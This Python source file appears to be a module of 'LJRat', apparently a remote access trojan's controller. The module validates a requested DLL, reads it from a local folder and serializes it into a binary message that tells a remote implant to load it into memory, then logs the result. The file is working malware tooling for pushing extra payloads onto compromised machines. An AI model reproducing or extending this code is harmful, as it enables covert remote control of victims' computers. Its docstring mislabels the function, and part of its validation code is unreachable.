"""
Module that adds the put functionality to LJRat
"""

import struct
import message
import os
import log
from error import *
from helper import str_to_c_str
from globals import ctx
from session import HEADER_LEN, INT_SIZE
from modules import mod_funcs


MODULE_ID = 0x06
LOADABLE = False
DLL_NAME = None
PARENT = None

def entrypoint(self, args):
    """ Load a module into memory """
    
    # Validate local file exists prior to building the message
    args = validator(args)
    if not args:
        return None

    module_args = {"MODULE_NAME": args[0], "REMOTE_MODULE_ID": args[1], "JOB_ID": ctx.get_next_job()}
    ctx.update_loaded_module(args[0].split('/')[1], module_args["JOB_ID"], 1)
    msg = message.Message(_serialize(module_args))
    return (msg, E_SUCCESS)


def validator(args):
    '''Function to check if module is already loaded and file exists locally'''
    args = args.split()
    dll_loaded =  False
    dll_exists = False

    # Check to see if module is loaded
    # More advanced modules enable more then one command, will have to look up by parent as well
    for k, v in ctx.loaded_modules.items():
        if k == args[0]:
            dll_exists = True
            if v.get("loaded") == True:
                dll_loaded = True
        if v.get("parent") == args[0]:
            dll_exists = True
            if v.get("loaded") == True:
                dll_loaded = True
    
    if dll_exists and dll_loaded:
        print("Module already loaded")
        return None
    elif dll_exists and not dll_loaded:
        path = 'bin/' + ctx.loaded_modules[k].get("dll_name")
        module_id = ctx.loaded_modules[k].get("module_id") 

        if not os.path.exists(path):
            print("Module dll not found on disk")
            return None
        args = [path, module_id]
    else:
        print("Unknown module")
        args =  None

    return args




    if ctx.loaded_modules[args[0]]["loaded"]:
        print("Module already loaded")
        return None

    module_id = ctx.loaded_modules[args[0]]["module_id"]
    dll_name = ctx.loaded_modules[args[0]]["dll_name"]

    # Need to determine what dll to upload (32/64)
    path = 'bin/' + dll_name


    
    args = [path, module_id]
    return args

def _serialize(data):
    '''Function to take all the required arguments and pack a data structure with binary data'''
    serialized_data = bytearray()
    file_bytes = None

    result_code = 0
    cmd_type = MODULE_ID
    job_id = data["JOB_ID"]

    with open(data["MODULE_NAME"], "rb") as infile:
        local_file = infile.read()
    
    local_DLL_len = len(local_file)
    remote_module_id = data["REMOTE_MODULE_ID"]
    data_len = HEADER_LEN + INT_SIZE + INT_SIZE + local_DLL_len

    serialized_data.extend(struct.pack("I", data_len))
    serialized_data.extend(struct.pack("I", job_id))
    serialized_data.extend(struct.pack("I", cmd_type))
    serialized_data.extend(struct.pack("I", result_code))
    serialized_data.extend(struct.pack("I", remote_module_id))
    serialized_data.extend(struct.pack("I", local_DLL_len))
    serialized_data.extend(struct.pack(f"{local_DLL_len}s", local_file))

    return serialized_data


def _deserialize(msg):
    '''Function that calls the formatter and outputs the data to a log'''
    log_dir = ctx.log_dir

    if msg.result_code == E_SUCCESS:
        log.write_to_log(log_dir, ".load", ERROR_TABLE[msg.result_code], "Module loaded successfully")
        ctx.update_loaded_module(None, msg.job_id, 0)
    else:
        print(f"Error loading module: {ERROR_TABLE[msg.result_code]}")

    return